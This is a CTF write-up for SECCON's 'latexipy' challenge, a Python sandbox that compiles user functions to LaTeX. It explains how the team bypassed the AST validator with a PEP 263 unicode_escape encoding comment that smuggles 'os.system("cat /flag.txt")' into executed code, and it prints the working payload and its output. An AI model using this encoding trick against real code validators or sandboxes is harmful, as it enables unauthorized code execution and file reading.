# latexipy

Author: Ark  
Description: Latexify as a Service

```bash
nc latexipy.seccon.games 2337
```

Download: https://dashboard.quals-score.seccon.jp/api/download?key=prod%2Flatexipy%2Flatexipy.tar.gz  
7b2ed010380f766dab072daea23653f32de7eb84

Solves: 8

jCTF solvers: Disconnect3d, GwynBleiD, haqpl, Overflo, mrarm, szymex73, artcz, Kusik  
Writeup author: Kusik

---

## Application

The application makes use of Google's *[latexify_py](https://github.com/google/latexify_py)* library - Python package which compiles Python source code to a corresponding Latex expression.  
It reads our input, awaiting a proper python function definition, ended with \_\_EOF\_\_ string:

```python
"""
E.g.
def solve(a, b, c):
    return (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)
__EOF__
"""

source = ""
while True:
    line = sys.stdin.readline()
    if line.startswith("__EOF__"):
        break
    source += line
```

It parses input into AST - Abstract Syntax Tree - and then it goes through few checks:
1. Verification if the parsing went alright - ```if type(root) is not ast.Module```
2. Check if there is only one element in the body - ```if len(root.body) != 1```
3. If the first parsed element is the function definition - ```if type(fn) is not ast.FunctionDef```
4. If the function does not include any decorators, type annotations or default parameters - it unparses the function to the text representation and validates using regex - ```if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn))```

In case of failed validation, the program closes itself.

```python
def get_fn_name(source: str) -> str | None:
    root = ast.parse(source)
    if type(root) is not ast.Module:
        return None
    if len(root.body) != 1:
        return None

    fn = root.body[0]
    if type(fn) is not ast.FunctionDef:
        return None

    fn.body.clear()
    if not re.fullmatch(r"def \w+\((\w+(, \w+)*)?\):", ast.unparse(fn)):
        # You must define a function without decorators, type annotations, and so on.
        return None

    return str(fn.name)

name = get_fn_name(source)
if name is None:
    print("Invalid source")
    exit(1)
```

After the successful validation, our code is appended before a call to ```latexify.get_latex()``` function, saved to the file and executed as a module:

```python
source += f"""
import latexify
__builtins__["print"](latexify.get_latex({name}))
"""

with tempfile.NamedTemporaryFile(suffix=".py") as file:
    file.write(source.encode())
    file.flush()

    print()
    print("Result:")
    spec = util.spec_from_file_location("tmp", file.name)
    spec.loader.exec_module(util.module_from_spec(spec))
```

Besides the source code, there were also *Dockerfile* and *requirements.txt*.

---

## What we know then?

Included *Dockerfile* and *requirements.txt* informed us about Python and latexify versions:
* Python3.10.8 - released a day before (Oct. 11, 2022)
* latexify-py == 0.1.1 - the freshest version from Pypi repository

Python in the newest version could be read as a hint, that the solutoin won't be some obscure bug from old Python versions. *Latexify* on master was already few commits ahead of the release.

From the source code we can read that:
* we probably cannot overwrite ```latexify.get_latex``` function, as the ```import latexify``` line is added after defining our function.
* we cannot overwrite ```print``` function, as it's called from ```__builtins__```, to make sure that's the correct one.
* we cannot overwrite ```__builtins__```, as function definition is not subscriptable - the code would throw an exception.

## What we can do?

We had a few ideas which we concluded from the above and which we tried before getting to the right one. I will list them in the random order:

* Overwrite some function from the ```__builtins__``` what would somehow affect latexify execuction  
    * We tried overwriting built-ins locally and executing *latexify* - it still worked without any problems
* Inject the code into the ```name``` variable
* Break validation using Unicode characters
* Add the code which would be executed automatically during interpretation - and would still pass the validation
* Search for the bug in the latexify_py


### Automatically executed code

We cannot just add a line ```print(os.system('cat flag.txt'))```, as it wouldn't pass the validation. But - if we would somehow be able to add default parameter to the function or decorator - then we would be able to do this.

Check this example:
```python
import os

def test(a, b=os.system('cat flag.txt')):
    return a+b

def test2(func):
    os.system('cat flag.txt')

@test2
def test3():
    return 'test'

print("test")
```

Python by default would 'prepare' the default arguments or wrappers - the result of it would be:
```
SECCON{dummy}
SECCON{dummy}
test
```

As we had to start our input from clear function definition, we experimented around trying to nest a function in the function, something like:
```python
def test():
    def test2(a=print('test'))
        return a
    pass
```
But nothing worked - our main function was never called and that implied that nested functions were never 'prepared' by Python.

### Injecting the code into the ```name``` and breaking validation using Unicode characters

So what if we would be able to somehow ommit the validation using some Unicode? Or maybe inject the code into the ```name``` value? Something like:

```python
def A'))code_here(a,b):
    pass
```

Although Python documentation about [lexical analysis](https://docs.python.org/3/reference/lexical_analysis.html#grammar-token-python-grammar-identifier) didn't give a lot of hope, we still tried it. The code above didn't work, so we tried searching for some unicode characters:

```python
import unicodedata

for i in range(2**16):
    a = chr(i)
    x = unicodedata.normalize('NFKC', a)
    if x.isprintable() and a != x:
        print(i, chr(i), x)
```
We used NKFC, as stated in documentation:
> All identifiers are converted into the normal form NFKC while parsing; comparison of identifiers is based on NFKC.

There were a lot of characters - so we tried to limit this to some meaningful ones, by changing the condition:

```python
if x == '(':
...
if x == '=':
...
if x == ')':
```
And we found some:
```
...
61 = =
8316 ⁼ =
8332 ₌ =
65126 ﹦ =
65309 ＝ =
...
```

We then tried bruteforcing it, to see if any of these works:
```python
import re, ast, unicodedata

# This list doesn't include all of the tested characters
chars = list(map(chr, [41, 8318,8334,65078,65114,65289,40,8317,8333,65077,65113,65288]))

for i in chars:
    # We also tried different entrypoints than visible
    source = '''
def foo(a%sa):
    pass
    ''' % i

    try:
        root = ast.parse(source)
    except SyntaxError as e:
        print('ERR', e)
        continue

    fn = root.body[0]
    assert type(fn) is ast.FunctionDef
    fn.body.clear()
    unparsed = ast.unparse(fn)

    if re.fullmatch("def \w+\((\w+(, \w+)*)?\):", unparsed):
        print(f"Matched - {i}")
```

And well - Python is good here, we only got exceptions.

### Bug in latexify_py

We went through new commits and issues, if any of them is connected with any bug. Unfortunately, there were only new functionalities added.  
We went through the code which compiles Python into Latex, but again - nothing here... Or?

This piece of code was found:
```python
def get_latex(fn, *args, **kwargs):
    try:
        source = inspect.getsource(fn)
    # pylint: disable=broad-except
    except Exception:
        # Maybe running on console.
        source = dill.source.getsource(fn)
```

> dill extends python’s pickle module for serializing and de-serializing python objects to the majority of the built-in python types

We had this crazy idea - what if somehow we would get this Exception and maybe find some deserialization bug in *dill*? But finally, we didn't go through this, as we weren't sure that *dill* would be vulnerable as is *pickle* and we didn't know how to get this exception.


## Eureka moment

### PEP 263

> Hey, encoding declaration is working and passing the validation
>
> ~GwynBleidD, few hours into the task

I want you all to meet PEP, PEP 263 - called also *[Defining Python Source Code Encodings](https://peps.python.org/pep-0263/)*. This little enhancement proposal is adding a possibility to define a sourcefile encoding, by adding a comment (in first or second line):
```python
#Encoding: <text_encoding>
```

Possible encodings are listed [here](https://docs.python.org/3/library/codecs.html#text-encodings)

### Exploitation

> I've got old presentation where I described this one, I forgot about it
>
> ~Disconnect3d

We tried an old exploit - and as it happens, somehow AST Parser not always properly reads it, because one of our first tries with the following payload:
```python
# Encoding: Unicode_Escape\r\145\166\141\154\050\157\160\145\156 \050\042\146\154\141\147\042\051\056 \162\145\141\144\050\061\060\062\064 \051\051

def foo():
    pass

__EOF__
```
Failed the validation - as the debug said, we had two elements in the AST body:
```
AST Dump: ("Module(body=[Expr(value=Call(func=Name(id='eval', ctx=Load()), "
 "args=[Call(func=Attribute(value=Call(func=Name(id='open', ctx=Load()), "
 "args=[Constant(value='flag')], keywords=[]), attr='read', ctx=Load()), "
 'args=[Constant(value=1024)], keywords=[])], keywords=[])), '
 "FunctionDef(name='foo', args=arguments(posonlyargs=[], args=[], "
 'kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Pass()], '
 'decorator_list=[])], type_ignores=[])')
Body size: 2
Invalid source
```

But on the other attempt from **mrarm**:
```python
#Encoding: Unicode_Escape
#\nimport os\nos.system("cat /flag.txt")

def foo():
    pass
```
It just worked:
```
AST Dump: ("Module(body=[FunctionDef(name='foo', args=arguments(posonlyargs=[], args=[], "
 'kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Pass()], '
 'decorator_list=[])], type_ignores=[])')
Body size: 1

Result:

SECCON{dummy}
```

To be honest - I didn't had time to dig deep why there's this difference in parser results, but for sure that's something to verify.

---

# Solution

```python
#Encoding: Unicode_Escape
#\nimport os\nos.system("cat /flag.txt")

def foo():
    pass

__EOF__
```

The flag is: ```SECCON{UTF7_is_hack3r_friend1y_encoding}```